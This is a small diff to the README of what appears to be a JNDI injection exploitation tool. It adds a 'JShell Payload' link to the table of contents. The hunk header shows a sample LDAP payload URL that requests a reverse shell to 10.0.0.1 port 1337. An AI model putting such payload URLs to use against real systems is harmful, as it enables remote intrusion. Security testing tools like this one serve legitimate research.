@@ -79,6 +79,7 @@ ldap://10.0.0.1:1389/Basic/ReverseShell/10.0.0.1/1337
 - [Advanced Techniques](USAGE.en.md#advanced-techniques)
   - [Use Reference Only](USAGE.en.md#use-reference-only)
   - [Confusing Class Name](USAGE.md#confusing-class-name)
+  - [JShell Payload](USAGE.en.md#jshell-payload)
 
 ## ⚙️ Compile
 
